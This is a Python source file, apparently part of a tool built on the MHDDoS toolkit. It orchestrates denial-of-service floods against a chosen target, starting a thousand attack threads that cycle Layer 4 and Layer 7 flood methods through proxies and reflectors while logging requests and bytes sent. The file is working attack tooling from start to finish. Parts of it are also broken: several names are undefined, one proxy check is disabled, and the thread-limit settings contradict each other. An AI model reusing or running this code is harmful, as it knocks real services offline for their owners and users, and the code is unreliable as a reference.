import ctypes
import logging
import multiprocessing
import os
import random
import time
from contextlib import suppress
from dataclasses import dataclass
from multiprocessing import Process, Queue
from threading import Thread, Event
from typing import List

import psutil
from PyRoxy import Proxy
from blessed import Terminal

from MHDDoS.methods.layer_4 import Layer4
from MHDDoS.methods.layer_7 import Layer7
from MHDDoS.methods.methods import Methods
from MHDDoS.methods.tools import Tools
from MHDDoS.utils.config_files import read_configuration_file_lines
from MHDDoS.utils.connectivity import ConnectivityState, ConnectivityChecker
from MHDDoS.utils.misc import Counter, get_last_from_queue
from MHDDoS.utils.proxies import load_proxies
from MHDDoS.utils.targets import Target
from utils.logs import get_logger_for_current_process


term = Terminal()


class AttackError(Exception):
    """
    Exception class for attack errors.
    """
    pass


@dataclass(slots=True, order=True, frozen=True)
class AttackState:
    # identification
    attack_pid: int

    # target
    target: Target
    attack_methods: List[str] = None

    # performance
    active_threads_count: int = None
    cpu_usage: float = None

    # proxies
    total_proxies_count: int = 0
    used_proxies_count: int = 0

    @property
    def is_using_proxies(self): return (self.total_proxies_count > 0) and (self.used_proxies_count > 0)

    # connectivity
    connectivity_state: ConnectivityState | None = None

    @property
    def has_connectivity_data(self):
        return self.connectivity_state is not None

    # throughput
    total_requests_sent: int = None
    requests_per_second: int = None
    total_bytes_sent: int = None
    bytes_per_second: int = None
    time_since_last_packet_sent: float = None

    # exception
    exception: Exception = None


class Attack(Process):
    # PROCESS
    logger: logging.Logger = None
    process: psutil.Process = None
    cpu_usage: float = 0

    # ATTACK THREADS
    attack_threads: List[Thread] = []
    attack_threads_stop_events: List[Event] = []
    INITIAL_THREADS_COUNT = 1000
    THREADS_MAX_LIMIT = 1
    THREADS_MIN_LIMIT = 1
    THREADS_STEP = 10

    # CONNECTIVITY
    CONNECTIVITY_CHECK_INTERVAL = 60  # TODO: make this a parameter of attack()?
    connectivity_checker_thread: ConnectivityChecker = None
    connectivity_state: ConnectivityState = None

    # PROXIES
    PROXIES_CHECK_INTERVAL = 120  # TODO: make this a parameter of attack()?
    used_proxies: List[Proxy] = None

    # COUNTERS
    rolling_requests_counter = Counter()
    rolling_bytes_counter = Counter()
    total_requests_counter = Counter()
    total_bytes_counter = Counter()
    last_request_timestamp_counter = Counter()
    last_counters_update_time: float = -1

    # STATS
    requests_per_second: float = 0
    bytes_per_second: float = 0
    tp: int = 0
    tb: int = 0

    # CONFIG
    requests_per_connection: int = 100
    user_agents: List[str] = []
    referrers: List[str] = []
    proxies: List[Proxy] = []
    reflectors: List[str] = []

    def __init__(self,
                 target: Target,
                 attack_methods: List[str],
                 logging_queue: Queue,
                 requests_per_connection: int = 100,
                 proxies_file_path: str | None = "proxies/proxies.txt",
                 user_agents_file_path: str | None = "user_agents.txt",
                 referrers_file_path: str | None = "referrers.txt",
                 reflectors_file_path: str | None = None,
                 attack_state_queue: Queue = None):
        Process.__init__(self, daemon=True)

        self.target = target
        self.attack_methods = [m.upper() for m in attack_methods]
        self.requests_per_connection = requests_per_connection
        self.proxies_file_path = proxies_file_path
        self.user_agents_file_path = user_agents_file_path
        self.referrers_file_path = referrers_file_path
        self.reflectors_file_path = reflectors_file_path
        self.attack_state_queue = attack_state_queue
        self.logging_queue = logging_queue

    def run(self) -> None:
        # PREPARE LOGGER
        self.logger = get_logger_for_current_process(self.logging_queue, multiprocessing.current_process().name)
        logger = self.logger
        logger.info(f"Preparing attack upon {self.target}...")

        try:
            self.attack()
        except Exception as e:
            logger.exception(f"Attack process stopped due to {type(e).__name__}: ", exc_info=True)
        except (KeyboardInterrupt, SystemExit) as e:
            logger.info(f"Attack exiting due to {type(e).__name__}.")
        finally:
            self.cleanup()

    def attack(self):
        logger = self.logger

        # PREPARE PROCESS
        self.process = self.apply_process_modifications()

        # LOAD CONFIG FILES
        self.user_agents = read_configuration_file_lines(self.user_agents_file_path) if self.user_agents_file_path is not None else []
        self.referrers = read_configuration_file_lines(self.referrers_file_path) if self.referrers_file_path is not None else []
        self.proxies = load_proxies(self.proxies_file_path) if self.proxies_file_path is not None else []
        self.reflectors = []

        # PERFORM SANITY CHECKS
        self.perform_sanity_checks()

        # INITIALIZE COUNTERS
        self.update_throughput_counters()

        # INITIALIZE STATE MONITORING VARIABLES
        self.cpu_usage = self.process.cpu_percent()
        proxies_validation_state_queue = Queue()
        self.used_proxies: List[Proxy] = []
        connectivity_state_queue = Queue()
        self.post_status_update()

        # START CONNECTIVITY CHECKER THREAD
        self.connectivity_checker_thread = ConnectivityChecker(
            interval=self.CONNECTIVITY_CHECK_INTERVAL,
            target=self.target,
            proxies=self.proxies,
            state_queue=connectivity_state_queue,
            max_concurrent_connections=100
        )
        self.connectivity_checker_thread.start()

        # WAIT UNTIL VALID PROXIES ARE FOUND
        self.used_proxies = self.proxies
        if self.proxies and False:
            layer_string = "Layer 4 (TCP)" if self.target.is_layer_4 else "Layer 7 (HTTPS)"
            logger.info(f"Looking for valid ones among {len(self.proxies)} proxies through {layer_string}...")

            self.connectivity_state: ConnectivityState = connectivity_state_queue.get()

            if self.connectivity_state.has_valid_proxies:
                logger.info(f"Found {self.connectivity_state.valid_proxies_count} proxies which can reach the target.")
                self.used_proxies = self.connectivity_state.get_valid_proxies(self.proxies)
            else:
                raise AttackError(f"Target cannot be reached through any of {len(self.proxies)} provided proxy servers. "
                                  f"Attack will not be executed.")

        # ATTACK
        attack_methods_string = ", ".join(self.attack_methods)
        attack_methods_string += " attack methods" if len(self.attack_methods) > 1 else f" attack method"
        logger.info(f"Starting attack upon {self.target} using {attack_methods_string}.")
        for _ in range(self.INITIAL_THREADS_COUNT):
            self.start_new_attack_thread()

        while True:
            time.sleep(1)

            tslr = time.time() - float(self.last_request_timestamp_counter)
            self.cpu_usage = self.process.cpu_percent()

            # poll queues
            self.connectivity_state = get_last_from_queue(connectivity_state_queue, self.connectivity_state)
            if self.connectivity_state and self.connectivity_state.has_valid_proxies:
                self.used_proxies = self.connectivity_state.get_valid_proxies(self.proxies)
            else:
                self.used_proxies = self.proxies

            # update counters
            previous_pps = self.requests_per_second
            self.update_throughput_counters()

            ratio = self.requests_per_second / previous_pps if previous_pps > 0 else float("inf")
            THRESHOLD = 0.05
            # logger.info(f"{ratio} {ratio > 1 + THRESHOLD}")
            if ratio > 1 + THRESHOLD:  # TODO: use ratio
                self.increase_attack_threads()
            # elif ratio < 1:
            #     decrease_attack_threads()

            # TODO:
            #       - check CPU utilization
            #       - decrease/increase threads
            # step_up()
            #       - push attack status into the queue

            # generate attack status
            self.post_status_update()

            # log
            pps_string = Tools.humanformat(int(self.requests_per_second))
            bps_string = Tools.humanbytes(int(self.bytes_per_second))
            tp_string = Tools.humanformat(int(self.tp))
            tb_string = Tools.humanbytes(int(self.tb))

            per_second_string = f"{bps_string}/s / {pps_string} r/s"
            if int(self.bytes_per_second) == 0:
                per_second_string = term.red(per_second_string)
            else:
                per_second_string = term.green(per_second_string)

            total_string = f"{tb_string} / {tp_string} r"
            if int(self.total_bytes_counter) == 0:
                total_string = term.red(total_string)

            tslr_string = f"{tslr * 1000:.0f} ms"
            if tslr > 10:
                tslr_string = term.red(tslr_string)

            logger.info(f"Total sent: {total_string}, "
                        f"per second: {per_second_string}, "
                        f"tslr: {tslr_string}, "
                        f"threads: {len(self.attack_threads_stop_events)}, cpu: {self.cpu_usage :.0f}%")

    def perform_sanity_checks(self):
        """Checks if the attack can be executed."""
        logger = self.logger
        target = self.target
        proxies = self.proxies

        # check target
        if not target.is_valid:
            logger.error(f"Provided target ('{target}') does not have a valid IPv4 (or it could not be resolved). Please provide a valid target next time.")
        # check attack methods
        for attack_method in self.attack_methods.copy():
            # check if attack method is supported
            if attack_method not in Methods.ALL_METHODS:
                self.remove_invalid_attack_method(attack_method,
                                                  f"Provided method ('{attack_method}') is not supported.\nAvailable methods: {', '.join(Methods.ALL_METHODS)}")
            # check if attack method layer matches the target's layer
            if (attack_method in Methods.LAYER7_METHODS) and not target.is_layer_7:
                target_protocol_string = f"Layer 4" if target.is_layer_4 else f"unsupported"
                self.remove_invalid_attack_method(attack_method,
                                                  f"{attack_method} belongs to Layer 7 attack methods, but the provided target ('{target}') uses {target_protocol_string} protocol ({target.protocol}).")
            if (attack_method in Methods.LAYER4_METHODS) and not target.is_layer_4:
                target_protocol_string = f"Layer 7" if target.is_layer_7 else f"unsupported"
                self.remove_invalid_attack_method(attack_method,
                                                  f"{attack_method} belongs to Layer 4 attack methods, but the provided target ('{target}') uses {target_protocol_string} protocol ({target.protocol}).")
            # check Layer 4-specific conditions
            if attack_method in Methods.LAYER4_METHODS:
                # RAW SOCKET SUPPORT
                if attack_method in Methods.WHICH_REQUIRE_RAW_SOCKETS and not Tools.checkRawSocket():
                    self.remove_invalid_attack_method(attack_method,
                                                      f"Attack method {attack_method} requires a creation of raw socket, but it could not be created on this machine.")

                # REFLECTORS
                if self.reflectors_file_path is not None and attack_method in Methods.WHICH_SUPPORT_REFLECTORS:
                    if not self.reflectors_file_path:
                        self.remove_invalid_attack_method(attack_method,
                                                          f"The reflector file path is not provided.\n{attack_method} attack method requires a reflector file.")

                    reflectors_text = read_configuration_file_text(reflectors_file_path)
                    if reflectors_text is None:
                        self.remove_invalid_attack_method(attack_method,
                                                          f"The reflector file doesn't exist: {reflectors_file_path}.\n{attack_method} attack method requires a reflector file.")

                    reflectors = set(a.strip() for a in ProxyTools.Patterns.IP.findall(reflectors_text))
                    if not reflectors:
                        self.remove_invalid_attack_method(attack_method,
                                                          f"Did not find any reflectors in the provided file: {reflectors_file_path}.\n{attack_method} attack method requires a reflector file.")

                # PROXIES WARNING
                if proxies is not None and len(proxies) > 0:
                    if attack_method not in Methods.WHICH_SUPPORT_PROXIES:
                        self.remove_invalid_attack_method(attack_method,
                                                          f"{attack_method} attack method does not support proxies, while those are provided.\n"
                                                          f"Provide empty proxies file if you want to attack using {attack_method}.")
            # check bombardier
            if attack_method == "BOMB":
                raise NotImplemented("'BOMB' method support is not implemented yet.")
                # TODO: (maybe) add support for BOMBARDIER
                BOMBARDIER_PATH = Path(__dir__ / "go/bin/bombardier")
                assert (
                        BOMBARDIER_PATH.exists()
                        or BOMBARDIER_PATH.with_suffix('.exe').exists()
                ), "Install bombardier: https://github.com/MHProDev/MHDDoS/wiki/BOMB-attack_method"
        # check if we are left with any attack methods
        if len(self.attack_methods) == 0:
            logger.critical(f"None of the {len(self.attack_methods)} provided attack methods were valid. Attack will not be started.")
            raise AttackError

    def remove_invalid_attack_method(self, method: str, message: str):
        self.attack_methods.remove(method)
        self.logger.warning(f"{message}\n"
                            f"    '{method}' method will be omitted in the current attack.")

    def update_throughput_counters(self):
        time_since_last_update = time.perf_counter() - self.last_counters_update_time
        self.last_counters_update_time = time.perf_counter()

        # update total request counts
        self.total_requests_counter += int(self.rolling_requests_counter)
        self.total_bytes_counter += int(self.rolling_bytes_counter)

        # save current stats
        self.requests_per_second = int(self.rolling_requests_counter) / time_since_last_update if time_since_last_update > 0 else 0
        self.bytes_per_second = int(self.rolling_bytes_counter) / time_since_last_update if time_since_last_update > 0 else 0
        self.tp = int(self.total_requests_counter)
        self.tb = int(self.total_bytes_counter)

        # reset rolling counters
        self.rolling_requests_counter.set(0)
        self.rolling_bytes_counter.set(0)

    def post_status_update(self):
        """
        Posts an update about the course this attack to the attack_state_queue.
        """

        if self.attack_state_queue is None:
            return

        attack_status = AttackState(
            attack_pid=self.process.pid,
            attack_methods=self.attack_methods,

            target=self.target,

            active_threads_count=self.get_running_threads_count(),
            cpu_usage=self.cpu_usage,

            total_proxies_count=len(self.proxies),
            used_proxies_count=len(self.used_proxies),
            connectivity_state=self.connectivity_state,

            total_requests_sent=int(self.total_requests_counter),
            requests_per_second=int(self.requests_per_second),
            total_bytes_sent=int(self.total_bytes_counter),
            bytes_per_second=int(self.bytes_per_second),
            time_since_last_packet_sent=time.time() - float(self.last_request_timestamp_counter),
        )
        self.attack_state_queue.put(attack_status)

    # THREAD MANAGEMENT FUNCTIONS

    def start_new_attack_thread(self):
        stop_event = Event()
        stop_event.clear()

        # select random attack method from the available ones
        selected_attack_method = random.choice(self.attack_methods)

        # select proxies
        selected_proxies = self.used_proxies if selected_attack_method in Methods.WHICH_SUPPORT_PROXIES else None

        attack_thread = None
        if selected_attack_method in Methods.LAYER7_METHODS:
            attack_thread = Layer7(
                target=self.target.url,
                host=self.target.ip,
                method=selected_attack_method,
                rpc=self.requests_per_connection,
                synevent=stop_event,
                useragents=self.user_agents,
                referers=self.referrers,
                proxies=selected_proxies,
                bytes_sent_counter=self.rolling_bytes_counter,
                requests_sent_counter=self.rolling_requests_counter,
                last_request_timestamp=self.last_request_timestamp_counter
            )
        elif selected_attack_method in Methods.LAYER4_METHODS:
            attack_thread = Layer4(
                target=(self.target.ip, self.target.port),
                ref=self.reflectors,
                method=selected_attack_method,
                synevent=stop_event,
                proxies=selected_proxies,
                bytes_sent_counter=self.rolling_bytes_counter,
                requests_sent_counter=self.rolling_requests_counter,
                last_request_timestamp=self.last_request_timestamp_counter
            )
        else:
            self.logger.critical(f"Invalid attack method ('{selected_attack_method}') selected when starting attack thread. Aborting execution.")
            raise AttackError

        self.attack_threads.append(attack_thread)
        self.attack_threads_stop_events.append(stop_event)

        attack_thread.start()
        stop_event.set()

    def stop_attack_thread(self):
        if len(self.attack_threads_stop_events) == 0:
            return

        thread_to_stop_event = self.attack_threads_stop_events.pop()
        thread_to_stop_event.clear()

    def increase_attack_threads(self):
        for _ in range(self.THREADS_STEP):
            if self.get_running_threads_count() >= self.THREADS_MAX_LIMIT:
                break
            self.start_new_attack_thread()

    def decrease_attack_threads(self):
        for _ in range(self.THREADS_STEP):
            if self.get_running_threads_count() <= self.THREADS_MIN_LIMIT:
                break
            self.stop_attack_thread()

    def get_running_threads_count(self) -> int:
        # clear any dead threads from the list
        for i in range(len(self.attack_threads)):
            thread = self.attack_threads[i]
            if not thread.is_alive():
                self.attack_threads_stop_events.pop(i)
                self.attack_threads.pop(i)

        return len(self.attack_threads_stop_events)

    def cleanup(self):
        """Cleans up after the attack."""
        logger = self.logger

        if self.attack_threads:
            logger.info("Stopping attack threads...")
            for event in self.attack_threads_stop_events:
                event.set()
            # attack threads are daemons, so they will die anyway - we don't wait
            logger.info("Attack threads stopped.")

        if self.connectivity_checker_thread:
            logger.info("Stopping connectivity monitor...")
            self.connectivity_checker_thread.stop()
            self.connectivity_checker_thread.join()
            logger.info("Connectivity monitor stopped.")

        logger.info("Attack process finished.")

    @staticmethod
    def apply_process_modifications() -> psutil.Process:
        # FIX OPEN FILES LIMIT
        with suppress(ImportError):
            import resource
            soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
            if soft < hard:
                with suppress(Exception):
                    resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard))

        # LOWER PROCESS PRIORITY
        # this allows us to use other apps normally while the attack is running;
        # and if the CPU is free, attack will run with full performance anyway
        process = psutil.Process(os.getpid())
        if os.name == 'nt':
            process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
        else:
            process.nice(19)

        return process
